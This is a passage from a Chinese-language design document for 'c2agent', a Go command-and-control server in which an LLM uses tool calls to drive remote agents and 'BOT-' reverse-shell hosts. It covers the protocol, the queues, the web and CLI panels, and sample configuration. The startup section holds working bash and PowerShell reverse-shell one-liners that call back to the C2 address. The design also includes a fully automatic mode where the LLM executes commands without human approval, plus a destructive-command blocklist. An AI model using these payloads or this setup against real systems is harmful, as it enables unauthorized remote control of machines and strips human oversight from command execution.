    Temperature: openai.Float(cfg.Temperature),
})
for stream.Next() {
    chunk := stream.Current()
    // chunk.Choices[0].Delta.Content        → 正文增量
    // chunk.Choices[0].Delta.ToolCalls[...] → tool_calls 增量（按 index 聚合）
}
if err := stream.Err(); err != nil { /* 网络 / 接口错误 */ }
```

- 逐 delta 累积：`delta.content` → 正文增量，广播事件；
  `delta.tool_calls[].index` → 按 index 聚合 `id` / `function.name` /
  `function.arguments` 片段，流结束后拼接为完整调用。
- 消息构造使用库辅助构造器：`openai.SystemMessage` / `openai.UserMessage` /
  `openai.AssistantMessage` / `openai.ToolMessage`；带 tool_calls 的 assistant 消息须
  **原样回填**（含 `tool_calls`）后再追加 tool 结果。
- 兼容不支持流式 tools 的端点：可选关闭流式（`stream=false`）后一次性解析（配置开关）。

> 上述类型名以所锁定的 openai-go 版本为准，go.mod 固定版本号。

---

## 9. 授权与轮数

### 9.1 授权模式（`auth_mode`）

| 值 | 名称 | 语义 |
| -- | ---- | ---- |
| 0 | N-Auto | 所有动作需授权 |
| 1 | H-Auto | 低风险自动，高风险需授权 |
| 2 | F-Auto | 全部自动 |

- 低风险：`get_cwd`、`list_dir`、`read_file`。
- 高风险：其余全部（含 `exec_cmd` 及各类写/删/改）。
- 非法值回退 `0`。
- 仅约束 **LLM 生成的动作**；Web 面板中操作员手动直连命令/文件操作不受约束。

### 9.2 轮数（`round_limit`）

- 每轮「LLM→动作→回灌」计数；自动执行累加，**授权通过时清零**（拒绝不清零），
  任何模式均生效。达到上限结束本轮，等待用户下一句。
- 与授权模式解耦。

### 9.3 交互

- CLI：`/y`、`/n`、`/auth [0|1|2]`（切换后即时重评估当前动作，不再需授权则放行）。
- Web：三段式滑动选择器；等待授权期间切换模式即时重评估。
- 授权等待是**会话级**：一个 Agent 的多个会话可同时等待授权，各自独立应答；
  CLI 只对当前活动会话显示，Web 按会话分别弹窗。
- 授权等待上限 **5 分钟**，超时视为拒绝（`awaitAuth` 在宣布请求前先登记决定通道，避免竞态丢单）。

### 9.4 执行超时与队列超时（`policy.timeout_action`）

| 阶段 | 是否受超时 | 说明 |
| ---- | ---------- | ---- |
| 排队等待（尚未出队） | **否** | Job 在队列中等待任意长时间均有效；仅受会话取消 / Agent 下线影响 |
| 执行中（dispatcher 已取出） | **是** | `context.WithTimeout(job.ctx, cmd_timeout)` 包裹 Backend 调用 |

执行超时后的处理由 `policy.timeout_action` 决定：

- `"disconnect"`（默认）：认为受控端状态不可靠（可能被挂起命令占用读循环），
  关闭该 Agent 连接、令其**所有会话**与队列收到网络错误，等待受控端重连。
- `"fail"`：仅令**当前会话**该 Job 失败并继续队列；适用于可容忍后续命令
  排队等待的场景（存在后续 Job 连续超时的风险，需自行评估）。

> 长任务建议：让 LLM 用带重定向的独立运行方式（Linux `nohup cmd > log 2>&1 &` /
> Windows `start "" /b cmd > log 2>&1`）使 `exec_cmd` 立即返回，避免触发超时。

---

## 10. 多会话、指令队列与并发

### 10.1 三层并发模型

| 层级 | 并发粒度 | 规则 |
| ---- | -------- | ---- |
| 会话（Session） | 每会话一个 goroutine | 会话间完全独立，可并发调用 LLM、并发等待授权 |
| Agent 指令队列 | 每 Agent 一条 FIFO | 同一 Agent 的 Job **串行执行**，跨会话按入队顺序 |
| Agent 连接 | 每连接一把 `writeMu` | 保证心跳/响应/数据包字节级不交错 |

### 10.2 线性队列语义

- 每个 Agent 在注册时启动**唯一 dispatcher goroutine**，从 `jobs` channel 逐条取 Job 执行。
- 多会话产生的 Job 在同一队列中按**入队先后 FIFO**；不同 Agent 队列相互独立、完全并发。
- 队列元素携带 `SessionID` + `Result chan`，执行结果**只回传来源会话**，不串扰其他会话。
- 文件上传/下载、直连命令、关闭操作与动作指令**共用同一队列**，因此命令与传输永不交错。
- 队列容量为有界 channel；队满时入队阻塞（**仍不超时**），对会话形成背压。

### 10.3 超时与状态保护

- **排队等待不超时；执行中受 `cmd_timeout`**（详见 §9.4）。
- dispatcher 执行期间 `activeOps++`；Native 心跳 watchdog 跳过 `activeOps>0` 的 Agent（防误踢）。
- 会话停止/关闭：置 `job.cancelled`；未执行的 Job 直接跳过，执行中的按 Backend 能力取消或丢弃结果。

### 10.4 会话韧性

- 会话以**后台 goroutine** 运行，页面刷新/断连不中断；Web 重新订阅时先重放该会话状态快照
  （已生成正文 / 待授权动作 / 已执行结果），再接收实时事件（事件带 `agent` + `session` 字段过滤）。
- 关闭窗口不等于关闭会话；需显式 Stop 或 Close Session。

---

## 11. C2 模块设计（Go）

### 11.1 `internal/config`

- 结构：`LLM`、`Web`、`Native`、`Shell`、`Transfer`、`Policy` 分区。
- 加载 JSON；目录解析（`dl_temp_dir` 空 = `<cwd>/downloads`；`ul_temp_dir` 空 = 系统临时目录）。
- 校验：`auth_mode∈{0,1,2}`；Native `auth_token` 非空时才能启用；
  端口冲突检测；`cmd_timeout ≥ heartbeat_timeout`。

### 11.2 `internal/protocol`

- 常量、`EncodeHeader/DecodeHeader`、`EncodeTLV/DecodeTLV`、
  `EncodeRequest/EncodeResponse/EncodeDataPacket`、`PacketReader`（内部缓冲，处理半包/粘包）。
- 与 `remote/common/protocol.py` **逐字段对齐**。

### 11.3 `internal/crypto`

- 纯 Go ChaCha20（RFC 7539，32B key / 96b nonce / 32b counter），
  经 RFC 7539 §2.3.2 测试向量验证。
- `DeriveMaterial(token, nonce, dir)` 派生每连接的 key+nonce（公式见 §5.2）；
  跨 Go/C/Python 三端固定测试向量保证一致。
- `EncryptedConn`：包装 `net.Conn`，`Read` 解密、`Write` 加密，
  维护双向流计数（支持任意粘包/半包边界）。

### 11.4 `internal/command`

- 单一动作表：`name → {cmdCode, params[], lowRisk, description, schema}`。
- `CheckSafety(action, params)`：对 `exec_cmd` 及 Shell 生成命令做黑名单/正则拦截
  （如 `rm -rf /`、`format c:`、`mkfs.`、`dd if=/dev/zero` 等）。
- `RequiresAuth(mode, action)`；`CodeFor` / `ParamsFor`（按固定顺序）。

### 11.5 `internal/agent/native`

- **server.go**：`net.Listen` → accept loop；每连接：
  1. 读 `register`（仅 nonce）→ 回 `register_response`；
  2. 建 ChaCha20 上下文 → 读 `register_confirm`（解密）→ `Registry.Register`；
  3. 启动读循环，分发：心跳、disconnect、数据包路由、pending 响应。
  4. watchdog：`active_ops==0` 且心跳超时的 Agent 断开并移除。
- **backend.go**：`forward`（注册 future、写包、等响应、超时→NetworkError）；
  `SendControl`；`Upload`/`Download`（由队列串行调用，1024B 分包）。
- 用 channel 实现 `pending map[uint64]chan result`，读循环按 `request_id` 投递。

### 11.6 `internal/agent/shell`

- **server.go**：accept loop → 分配 `BOT-XXX` + marker → 启动读循环 →
  OS 探测 → hostname → `Registry.Register`。EOF 即移除。
- **backend.go**：`request(cmd)` 写 `cmd\necho <marker>\n`，等 marker 行，
  `stripShellResponse` 清理回显/提示符；线性调度（busy 则拒绝）。
- **shellcmd.go**：动作 → 单条 shell 命令（按 OS），含 base64 上传/下载构造与
  `formatListing` 归一化。

### 11.7 `internal/engine`

- `Engine` 持有 Registry、LLM client、config，并管理**多会话**：
  `sessions map[SessionID]*Session`、`agentIndex map[agentID]→sessions`、
  `activeSession map[agentID]SessionID`。
- `NewSession(agentID, title) *Session` / `CloseSession(id)` / `ListSessions(agentID)` /
  `SetActiveSession(agentID, id)` / `ResetConversation(sessionID)`。
- `BeginChat(sessionID, message)`：为**该会话**启动后台 goroutine（同一会话重复启动拒绝；
  同一 Agent 的不同会话可同时运行）。
- 会话事件经 **SSE** 推送：`GET /api/chat-stream?session_id=` 返回 `text/event-stream`，
  前端以 `EventSource` 订阅；"附加"模式先重放该会话快照，再接收实时增量。
- `Stop(sessionID)`、`SubmitAuth(sessionID, ok)`。
- `events.go`：订阅者集合 + 广播，事件带 `agent` + `session` 字段；客户端按字段过滤。

### 11.8 `internal/web`

- 标准库 `net/http`（Go 1.22 `ServeMux` 方法路由）+ `go:embed` 内嵌 `ui/`；**纯 Go、无 CGO**。
- 关键接口：
  - `GET /api/config`、`GET /api/agents`、`POST /api/agents/switch`
  - **会话**：`GET /api/sessions?agent_id=`、`POST /api/sessions/new`、
    `POST /api/sessions/close`、`POST /api/sessions/activate`、
    `GET /api/history?session_id=`
  - `POST /api/set-auth`、`POST /api/authorize-execute`（带 `session_id`）、
    `POST /api/stop`（带 `session_id`）、`POST /api/reset`（带 `session_id`）
  - `GET /api/chat-stream`（带 `session_id`；返回 SSE，附加时先重放快照）
  - `POST /api/exec-cmd`（直连命令，入 active Agent 的队列，不属任何会话）
  - `GET /api/files/list`、`POST /api/files/{parent,chdir,new,delete,mkdir,copy,move}`
  - `GET /api/files/download`、`POST /api/files/upload`
- SSE 事件均携带 `agent` 与 `session` 字段，前端按当前会话过滤。
- 前端 `ui/`：左侧 Agent 列表、会话标签页（多会话切换/新建/关闭）、聊天区（Markdown / 终端风格）、
  授权弹窗、文件管理器、主题切换、授权模式滑动选择；**零构建**（原生 HTML/JS，移植既有控制台风格）。
- 上传：浏览器字节流式缓冲到 `ul_temp_dir`（uuid 唯一名）→ 传输 → 删除临时文件。
- 下载：两类受控端统一落到 `dl_temp_dir/<basename>`（重名覆盖）→ `http.ServeContent` 回传浏览器（临时文件保留）。
- 文件路径按 active Agent 的 OS 归一化（Windows 驱动器根处理）。

### 11.9 `internal/cli`

- 交互循环；命令：
  - `/agents`、`/target <id>`（切 Agent）
  - **`/sessions`、`/new [title]`、`/use <id|index>`（切会话）、`/close <id>`**
  - `/auth [0|1|2]`、`/reset`
  - `/upload <local> <dest>`、`/download <src>`、`/shutdown`、`/help`、`/quit`
- 当前上下文 = 活动 Agent + 活动会话；普通消息只进入活动会话。
- 授权提示 `/y` `/n` `/auth ...`；其他会话的授权在其被切为活动时提示。

### 11.10 `cmd/c2agent/main.go`

- 解析 `--mode cli|web`、`--config`。
- 加载配置 → 建 Registry → 按配置启动 `NativeServer` 与 `ShellServer`（各自 goroutine）
  → 建 Engine（会话管理）。每个 Agent 注册时由 Registry 启动其 `runDispatcher`。
- `--mode cli`：进入 `internal/cli` 循环。
- `--mode web`：启动 `internal/web` HTTP 服务（SSE + 内嵌 UI），浏览器访问。
- 优雅退出：取消 context、关闭监听、关闭所有连接与队列。

---

## 12. 配置样例（`config_c2.example.json`）

```json
{
  "llm": {
    "api_base": "http://localhost:11434/v1",
    "api_key": "deepseek",
    "model": "deepseek",
    "temperature": 0.7,
    "stream": true,
    "system_prompt": "You are an AI assistant that helps the user execute tasks.\nCURRENT OPERATING SYSTEM: {system_name}\n\nYou accomplish tasks exclusively through the provided tools. Rules:\n- Prefer absolute paths; the shell does not keep state between commands.\n- Read-only tools (get_cwd, list_dir, read_file) are safe; higher-risk tools may require user authorization.\n- For long-running tasks, start them detached (e.g. nohup ... & / start \"\" /b ...) so the tool returns promptly.\n"
  },

  "web": {
    "listen_host": "127.0.0.1",
    "listen_port": 8880
  },

  "native": {
    "enabled": true,
    "listen_host": "0.0.0.0",
    "listen_port": 8881,
    "auth_token": "change-me-shared-token",
    "heartbeat_timeout_sec": 60
  },

  "shell": {
    "enabled": true,
    "listen_host": "0.0.0.0",
    "listen_port": 8882,
    "bot_prefix": "BOT-"
  },

  "policy": {
    "auth_mode": 0,
    "round_limit": 20,
    "cmd_timeout": 60,
    "timeout_action": "disconnect",
    "max_sessions_per_agent": 8,
    "queue_capacity": 256
  },

  "transfer": {
    "dl_temp_dir": "",
    "ul_temp_dir": ""
  }
}
```

说明：
- `native` 与 `shell` 各自 `enabled` / 监听地址 / 端口，**相互独立**；可只启用其一。
- Native 必填 `auth_token`（与 `remote` 端 `--auth-token` 一致）；Shell 无鉴权。
- `policy.auth_mode`：0=N-Auto / 1=H-Auto / 2=F-Auto。
- `policy.timeout_action`：执行超时后的处理，`disconnect`（默认，断开该 Agent）或
  `fail`（仅失败当前会话 Job，继续队列）。**排队等待始终不超时**。
- `policy.max_sessions_per_agent`：单 Agent 最大会话数；`policy.queue_capacity`：指令队列容量。
- `web.listen_host` / `listen_port`：Web 面板监听（默认 `127.0.0.1:8880`）；建议仅本机或 VPN。
- `transfer.dl_temp_dir` 空 = 程序工作目录 `downloads/`；`ul_temp_dir` 空 = 系统临时目录。

---

## 13. 启动与运行

```bash
# 本机构建
go build -o bin/c2agent ./cmd/c2agent

# 跨平台交叉编译（纯 Go / CGO_ENABLED=0）
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o bin/c2agent_windows_amd64.exe ./cmd/c2agent
CGO_ENABLED=0 GOOS=linux   GOARCH=amd64 go build -o bin/c2agent_linux_amd64       ./cmd/c2agent
CGO_ENABLED=0 GOOS=darwin  GOARCH=arm64 go build -o bin/c2agent_darwin_arm64      ./cmd/c2agent

# 运行（CLI）
./bin/c2agent --mode cli --config config_c2.json
# 运行（Web，浏览器打开 http://127.0.0.1:8880）
./bin/c2agent --mode web --config config_c2.json
```

**受控端 A（Native）**：

```bash
# Python 受控端（导入已按当前目录布局调整）
python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token change-me-shared-token
# C 受控端（编译见 remote/remote-c/COMPILE.txt）
./c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token change-me-shared-token
# Go 受控端（remote/remote-go，独立 module）
./remote/remote-go/c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token change-me-shared-token
```

**受控端 B（Shell）**：

```bash
# Linux：反弹到 Shell 端口 8882
bash -c 'bash -i >& /dev/tcp/<C2_IP>/8882 0>&1'
# Windows PowerShell 一行式（把 <C2_IP> 换成 C2 地址）
powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',8882);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[Text.Encoding]::UTF8.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$sb=[Text.Encoding]::UTF8.GetBytes($o);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

启动后 Web 面板 / CLI 中同时可见 `server-01`（native）与 `BOT-001`（shell）。

---

## 14. 安全设计

| 风险 | 措施 |
| ---- | ---- |
| 任意客户端注册 Native | 挑战-响应：token 不明文；校验失败即断开、不注册 |
| Native 流量窃听 | 认证后 ChaCha20 全流量加密 |
| Shell Bot 无鉴权 | 明文；建议仅在内网/VPN 使用，或端口仅绑定内网 |
| 破坏性命令 | `CheckSafety` 黑名单/正则；`auth_mode` 分级授权 |
| Web 面板暴露 | 默认 `127.0.0.1`；公网需 SSH 隧道 / 反代 + 鉴权（v2） |
| 凭据泄露 | token 存配置文件（建议权限 600）；不写入日志 |
| 协议重放 | v1 静态 token；v2 可加 nonce+HMAC / TLS |

---

## 15. 错误处理

| 类别 | 判定 | 处理 |
| ---- | ---- | ---- |
| 成功 | 正常结果 | 作为 tool 结果回灌 LLM |
| 业务错误 | 结果以 `Error:` 开头 | 作为 tool 结果回灌，由 LLM 决策 |
| 网络错误 | 超时/断连/协议异常/未知 request_id | 抛 `NetworkError`；会话追加 `[Network Error]` 系统消息；按策略移除 Agent；事件推 error+done |
| 安全拦截 | `CheckSafety` 失败 | tool 结果 `Error: blocked by safety check` |
| 用户拒绝 | 授权被拒 | 动作**不下发**；tool 结果 `Error: user denied command execution (not executed)`，**结束本轮** |
| 解析失败 | tool arguments 非法 JSON | tool 结果返回解析错误提示，让模型纠正 |

---

## 16. 实施计划（里程碑）

| 阶段 | 内容 | 交付 |
| ---- | ---- | ---- |
| M1 | `config` + `protocol` + `crypto`（含 ChaCha20 测试向量） | 单元测试通过，与 remote-py 握手联调 |
| M2 | `agent` 抽象 + **线性指令队列/Job/dispatcher** + `native` server/backend | 能列出/读/写/执行，上传下载通过，watchdog 生效，超时语义正确 |
| M3 | `shell` server/backend + shellcmd | 反弹 shell 可探测、执行、文件管理 |
| M4 | `llm` client + tools + `engine`（**多会话 + 每 Agent 队列** + 授权/轮数/事件） | CLI 下多会话并发、双类 Agent 均可驱动，结果回传正确会话 |
| M5 | `web`（net/http + SSE + 会话管理 + 文件 API + `go:embed` 前端） | 浏览器全流程可用，刷新/重连不断会话，多会话独立 |
| M6 | `cli` 完善 + 构建脚本 + README + 联调回归 | 双模式产物，跨平台编译 |

---

## 17. 审核结论（已确认 · 2026-09-26）

| # | 审核点 | 确认结论 |
| - | ------ | -------- |
| 1 | 双受控端并存 | ✅ 受控端各自独立、**端口独立、参数由配置文件控制**（Native 8881 / Shell 8882，可分别启停） |
| 2 | Native 兼容性 | ✅ **完全逐字节兼容**，仅允许变量/参数级微调（如 `READ_FILE_LIMIT=51200`） |
| 3 | 加密算法 | ✅ **ChaCha20 自实现**（无三方依赖） |
| 4 | LLM 指令机制 | ✅ **原生 Tool / Function Calling** |
| 5 | 授权与轮数 | ✅ **沿用现有设计**（三级 `auth_mode` + 授权通过重置轮数） |
| 6 | Shell Bot 鉴权 | ✅ **不鉴权**（连接即在线） |
| 7 | Web 框架 | ✅ **仅用标准库**（`net/http` + `go:embed`） |
| 8 | 前端形态 | ✅ **保持现有设计**（单页 `index.html`，原生 HTML/JS，零构建） |
| 9 | 项目 / module 命名 | ✅ **`c2agent`** |
| 10 | 配置结构 | ✅ **保持分区设计**（`llm/web/native/shell/policy/transfer`） |
| 11 | 多会话模型 | ✅ 遵循建议：每 Agent 多会话，独立历史/轮数/授权 |
| 12 | 队列超时语义 | ✅ 遵循建议：排队不超时；执行中 `cmd_timeout`；超时默认断开 Agent |
| 13 | 调度公平性 | ✅ 遵循建议：严格 FIFO（先入先执行） |
| 14 | 直连命令 / 文件操作 | ✅ 遵循建议：走同一 Agent 队列串行 |
| 15 | LLM 库 | ✅ 遵循建议：`github.com/openai/openai-go` 官方库 |
| 16 | 交叉编译 | ✅ 遵循建议：全依赖纯 Go、`CGO_ENABLED=0` 交叉编译 |

---

## 18. 后续扩展（v2+）

1. TLS 叠加（Native）与 Shell Bot 连接口令。
2. `edit_file` 在 Native 端补全（当前已有 `0x08`）。
3. 断点续传 / 压缩传输。
4. Web 鉴权（Basic Auth / Token），用于公网部署。
5. 命令白名单 ACL（受控端侧二次校验）。
6. 审计日志 `audit.log`（动作/目标/结果哈希）。
7. 流式任务进度（长命令进度经 SSE 推送）。
8. 单一入口多协议自动分流（首包探测 Native vs Shell）。
9. 队列按会话公平轮转调度（可选加权/优先级）。
10. 会话持久化（历史落盘，重启恢复）。
11. 受控端单连接多通道并发（需改 remote 协议，突破单 Agent 线性执行瓶颈）。
```
